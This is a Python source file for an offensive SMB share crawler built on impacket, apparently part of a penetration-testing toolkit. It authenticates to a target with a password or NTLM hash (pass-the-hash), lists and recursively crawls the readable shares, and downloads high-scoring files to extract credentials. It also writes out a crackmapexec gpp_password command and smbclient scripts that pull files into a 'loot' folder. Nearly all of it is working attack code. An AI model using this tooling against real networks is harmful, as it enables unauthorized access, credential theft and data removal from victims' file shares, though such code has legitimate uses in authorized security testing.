"""
SMB Share Crawler

Crawls SMB shares for sensitive files using impacket.
Integrates with FileDiscoveryBase for consistent scoring and
ConfigParserRegistry for automatic credential extraction.

Usage:
    crawler = SMBCrawler("10.10.10.172", "user", "password", "DOMAIN")

    # List accessible shares
    shares = crawler.list_sources()

    # Crawl for interesting files
    for file in crawler.crawl("users$"):
        print(f"{file.path} (score: {file.interesting_score})")

    # Full pipeline: crawl + parse + extract credentials
    result = crawler.crawl_and_extract()
    for cred in result.credentials:
        print(f"Found: {cred.upn}")
"""

from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, Iterator, List, Optional, Tuple
import io

from ..core.file_discovery import DiscoveredFile, FileDiscoveryBase
from ..core.models import DiscoveredCredential, SourceType, Confidence
from ..parsers.config_parser import (
    ConfigParserRegistry,
    ExtractionResult,
    NextStep,
    get_default_registry,
)

# Optional impacket import
try:
    from impacket.smbconnection import SMBConnection
    from impacket.smb3structs import FILE_READ_DATA
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False


@dataclass
class ShareInfo:
    """Information about an SMB share."""
    name: str
    remark: str = ""
    share_type: int = 0
    readable: bool = False
    writable: bool = False

    @property
    def is_interesting(self) -> bool:
        """Check if share is likely to contain useful data."""
        name_lower = self.name.lower()
        # Skip admin shares and IPC
        if name_lower in {'ipc$', 'print$'}:
            return False
        # Admin shares ($) are interesting if readable
        return self.readable


@dataclass
class CrawlResult:
    """
    Result from SMB crawl operation.

    Contains discovered files, extracted credentials, and next step suggestions.
    """
    files: List[DiscoveredFile] = field(default_factory=list)
    credentials: List[DiscoveredCredential] = field(default_factory=list)
    next_steps: List[NextStep] = field(default_factory=list)
    shares_accessed: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    @property
    def success(self) -> bool:
        return len(self.files) > 0 or len(self.credentials) > 0

    def merge(self, other: "CrawlResult") -> "CrawlResult":
        """Merge another result into this one."""
        self.files.extend(other.files)
        self.credentials.extend(other.credentials)
        self.next_steps.extend(other.next_steps)
        self.shares_accessed.extend(other.shares_accessed)
        self.errors.extend(other.errors)
        return self


class SMBCrawler(FileDiscoveryBase):
    """
    SMB share crawler using impacket.

    Extends FileDiscoveryBase with SMB-specific functionality:
    - Share enumeration with access testing
    - Recursive file crawling
    - Automatic credential extraction from discovered files

    Requires: impacket (pip install impacket)
    """

    def __init__(
        self,
        host: str,
        username: str,
        password: str,
        domain: str = "",
        port: int = 445,
        ntlm_hash: str = "",
    ):
        """
        Initialize SMB crawler.

        Args:
            host: Target IP or hostname
            username: Username for authentication
            password: Password (or empty if using hash)
            domain: Domain name (optional for local auth)
            port: SMB port (default 445)
            ntlm_hash: NTLM hash for pass-the-hash (format: LMHASH:NTHASH)
        """
        if not HAS_IMPACKET:
            raise ImportError(
                "impacket not installed. Install with: pip install impacket"
            )

        self.host = host
        self.username = username
        self.password = password
        self.domain = domain
        self.port = port
        self.ntlm_hash = ntlm_hash
        self._conn: Optional[SMBConnection] = None
        self._parser_registry = get_default_registry()

    def connect(self) -> bool:
        """
        Establish SMB connection.

        Returns:
            True if connection successful
        """
        try:
            self._conn = SMBConnection(self.host, self.host, sess_port=self.port)

            if self.ntlm_hash:
                lm, nt = self.ntlm_hash.split(':') if ':' in self.ntlm_hash else ('', self.ntlm_hash)
                self._conn.login(
                    self.username,
                    '',
                    self.domain,
                    lmhash=lm,
                    nthash=nt,
                )
            else:
                self._conn.login(
                    self.username,
                    self.password,
                    self.domain,
                )
            return True

        except Exception as e:
            self._conn = None
            raise ConnectionError(f"SMB connection failed: {e}")

    def disconnect(self):
        """Close SMB connection."""
        if self._conn:
            try:
                self._conn.logoff()
            except:
                pass
            self._conn = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.disconnect()

    def _ensure_connected(self):
        """Ensure connection is established."""
        if not self._conn:
            self.connect()

    def list_sources(self) -> List[str]:
        """
        List accessible SMB shares.

        Returns:
            List of share names that are readable
        """
        self._ensure_connected()
        shares = []

        try:
            share_list = self._conn.listShares()
            for share in share_list:
                name = share['shi1_netname'][:-1]  # Remove null terminator
                info = self._check_share_access(name)
                if info.readable:
                    shares.append(name)
        except Exception as e:
            pass

        return shares

    def list_shares_detailed(self) -> List[ShareInfo]:
        """
        List all shares with detailed access info.

        Returns:
            List of ShareInfo objects
        """
        self._ensure_connected()
        shares = []

        try:
            share_list = self._conn.listShares()
            for share in share_list:
                name = share['shi1_netname'][:-1]
                remark = share['shi1_remark'][:-1] if share['shi1_remark'] else ""
                share_type = share['shi1_type']

                info = self._check_share_access(name)
                info.remark = remark
                info.share_type = share_type
                shares.append(info)

        except Exception as e:
            pass

        return shares

    def _check_share_access(self, share_name: str) -> ShareInfo:
        """Check read/write access to a share."""
        info = ShareInfo(name=share_name)

        try:
            # Try to list root - indicates read access
            self._conn.listPath(share_name, '*')
            info.readable = True
        except:
            info.readable = False

        # TODO: Check write access by attempting to create temp file
        # info.writable = ...

        return info

    def crawl(
        self,
        source: str,
        max_depth: int = 3,
        max_files: int = 1000
    ) -> Iterator[DiscoveredFile]:
        """
        Crawl an SMB share for interesting files.

        Args:
            source: Share name (e.g., "users$", "SYSVOL")
            max_depth: Maximum directory depth
            max_files: Maximum files to return

        Yields:
            DiscoveredFile for each interesting file
        """
        self._ensure_connected()
        file_count = 0
        source_url = f"smb://{self.host}/{source}"

        def _crawl_dir(path: str, depth: int):
            nonlocal file_count
            if depth > max_depth or file_count >= max_files:
                return

            try:
                # List directory contents
                entries = self._conn.listPath(source, path + '*')

                for entry in entries:
                    if file_count >= max_files:
                        break

                    name = entry.get_longname()

                    # Skip . and ..
                    if name in ('.', '..'):
                        continue

                    full_path = f"{path}{name}" if path else name

                    if entry.is_directory():
                        # Recurse into directory
                        yield from _crawl_dir(full_path + '/', depth + 1)
                    else:
                        # Check if file is interesting
                        if self.should_skip(name):
                            continue

                        # Create DiscoveredFile
                        discovered = DiscoveredFile(
                            path=full_path,
                            source=source_url,
                            size=entry.get_filesize(),
                            modified_time=datetime.fromtimestamp(
                                entry.get_mtime_epoch()
                            ) if entry.get_mtime_epoch() else None,
                        )

                        self.score_file(discovered)

                        if discovered.interesting_score > 0:
                            file_count += 1
                            yield discovered

            except Exception as e:
                # Access denied or other error - skip this directory
                pass

        yield from _crawl_dir('', 0)

    def read_file(self, file: DiscoveredFile, max_size: int = 10_000_000) -> bytes:
        """
        Read file content from SMB share.

        Args:
            file: DiscoveredFile to read
            max_size: Maximum bytes to read

        Returns:
            File content as bytes
        """
        self._ensure_connected()

        # Extract share name from source URL
        # source format: smb://host/share
        share = file.source.split('/')[-1]

        buffer = io.BytesIO()
        try:
            self._conn.getFile(share, file.path, buffer.write)
            content = buffer.getvalue()

            if len(content) > max_size:
                content = content[:max_size]

            file.content = content
            return content

        except Exception as e:
            raise IOError(f"Failed to read {file.path}: {e}")

    def crawl_and_extract(
        self,
        shares: Optional[List[str]] = None,
        max_depth: int = 3,
        max_files_per_share: int = 500,
        auto_download: bool = True,
        min_score: int = 30,
    ) -> CrawlResult:
        """
        Full pipeline: crawl shares, download interesting files, extract credentials.

        Args:
            shares: List of share names (None = all accessible)
            max_depth: Maximum directory depth per share
            max_files_per_share: Max files to process per share
            auto_download: Automatically download and parse files
            min_score: Minimum interest score to download

        Returns:
            CrawlResult with files, credentials, and next steps
        """
        self._ensure_connected()
        result = CrawlResult()

        # Get share list
        if shares is None:
            shares = self.list_sources()

        if not shares:
            result.errors.append("No accessible shares found")
            return result

        context = {
            "target_ip": self.host,
            "domain": self.domain,
        }

        # Crawl each share
        for share in shares:
            try:
                result.shares_accessed.append(share)

                for file in self.crawl(share, max_depth, max_files_per_share):
                    result.files.append(file)

                    # Auto-download and parse high-scoring files
                    if auto_download and file.interesting_score >= min_score:
                        try:
                            content = self.read_file(file)

                            # Parse for credentials
                            parse_result = self._parser_registry.parse_file(
                                file.filename,
                                content,
                                context,
                            )

                            if parse_result.credentials:
                                # Update source to full SMB path
                                for cred in parse_result.credentials:
                                    cred.source = file.full_path
                                    cred.source_type = SourceType.SMB_SHARE

                                result.credentials.extend(parse_result.credentials)
                                result.next_steps.extend(parse_result.next_steps)

                        except Exception as e:
                            result.errors.append(f"Failed to parse {file.path}: {e}")

            except Exception as e:
                result.errors.append(f"Failed to crawl {share}: {e}")

        # Add summary next steps
        if result.files:
            summary = self.get_discovery_summary(result.files)
            if summary['high_priority'] > 0:
                result.next_steps.insert(0, NextStep(
                    action=f"Review {summary['high_priority']} high-priority files",
                    command=f"# Files with score >= 60 in: {', '.join(result.shares_accessed)}",
                    explanation="High-scoring files are most likely to contain credentials",
                    priority=1,
                ))

        # Deduplicate credentials
        seen = set()
        unique_creds = []
        for cred in result.credentials:
            key = (cred.username.lower(), cred.secret)
            if key not in seen:
                seen.add(key)
                unique_creds.append(cred)
        result.credentials = unique_creds

        # Sort next steps by priority
        result.next_steps.sort(key=lambda s: s.priority)

        return result

    def get_next_steps(self, files: List[DiscoveredFile], context: Dict[str, str]) -> List[NextStep]:
        """
        Generate next steps based on discovered files.

        Extends base class with SMB-specific suggestions.
        """
        steps = super().get_next_steps(files, context)
        target = context.get("target_ip", self.host)

        # Check for SYSVOL access
        sysvol_files = [f for f in files if 'sysvol' in f.source.lower()]
        if sysvol_files:
            steps.append(NextStep(
                action="Check SYSVOL for GPP passwords",
                command=f"crackmapexec smb {target} -u '{self.username}' -p '{self.password}' -M gpp_password",
                explanation="SYSVOL may contain Group Policy Preferences with encrypted passwords",
                priority=1,
            ))

        # Check for user profile access
        user_files = [f for f in files if 'users' in f.source.lower()]
        if user_files:
            steps.append(NextStep(
                action="Check user profiles for sensitive data",
                command="# Look for: .ssh, .gnupg, Documents, scripts with creds",
                explanation="User home directories often contain SSH keys, credentials, scripts",
                priority=2,
            ))

        return steps


def create_smb_crawler(
    host: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str = "",
) -> SMBCrawler:
    """
    Factory function to create SMBCrawler.

    Args:
        host: Target IP
        username: Username
        password: Password (or empty for hash auth)
        domain: Domain name
        ntlm_hash: NTLM hash for PTH

    Returns:
        Connected SMBCrawler instance
    """
    crawler = SMBCrawler(
        host=host,
        username=username,
        password=password,
        domain=domain,
        ntlm_hash=ntlm_hash,
    )
    crawler.connect()
    return crawler


def generate_retrieval_command(
    file: DiscoveredFile,
    host: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str = "",
) -> str:
    """
    Generate smbclient command to retrieve a discovered file.

    Args:
        file: DiscoveredFile to retrieve
        host: Target host/IP
        username: Username for authentication
        password: Password (or empty if using hash)
        domain: Domain name (optional)
        ntlm_hash: NTLM hash for pass-the-hash

    Returns:
        smbclient command string ready to copy/paste

    Example:
        smbclient //10.10.10.172/users$ -U 'MEGABANK.LOCAL\\SABatchJobs%SABatchJobs' -c 'get mhope/azure.xml'
    """
    # Extract share name from source URL (format: smb://host/share)
    share = file.source.split('/')[-1]

    # Build credential string
    if ntlm_hash:
        # Pass-the-hash: smbclient -U 'user%' --pw-nt-hash <hash>
        cred_part = f"-U '{username}%' --pw-nt-hash"
        hash_part = f" {ntlm_hash.split(':')[-1]}"  # Use NT hash part
    else:
        # Standard auth with domain prefix if provided
        if domain:
            cred_part = f"-U '{domain}\\{username}%{password}'"
        else:
            cred_part = f"-U '{username}%{password}'"
        hash_part = ""

    # Escape single quotes in file path
    safe_path = file.path.replace("'", "'\\''")

    return f"smbclient //{host}/{share} {cred_part}{hash_part} -c 'get {safe_path}'"


def generate_retrieval_commands_batch(
    files: List[DiscoveredFile],
    host: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str = "",
    output_dir: str = "loot",
) -> str:
    """
    Generate a bash script to retrieve multiple files.

    Args:
        files: List of files to retrieve
        host: Target host/IP
        username: Username for authentication
        password: Password
        domain: Domain name
        ntlm_hash: NTLM hash for PTH
        output_dir: Local directory to save files

    Returns:
        Multi-line bash script for batch retrieval
    """
    lines = [
        "#!/bin/bash",
        f"# Auto-generated SMB file retrieval script",
        f"# Target: {host}",
        f"mkdir -p {output_dir}",
        "",
    ]

    # Group files by share
    by_share: Dict[str, List[DiscoveredFile]] = {}
    for f in files:
        share = f.source.split('/')[-1]
        if share not in by_share:
            by_share[share] = []
        by_share[share].append(f)

    for share, share_files in by_share.items():
        lines.append(f"# === Share: {share} ===")
        for f in share_files:
            cmd = generate_retrieval_command(f, host, username, password, domain, ntlm_hash)
            # Modify to save to output dir with flattened name
            safe_name = f.path.replace('/', '_').replace('\\', '_')
            lines.append(f"{cmd} && mv '{f.filename}' '{output_dir}/{safe_name}'")
        lines.append("")

    return "\n".join(lines)
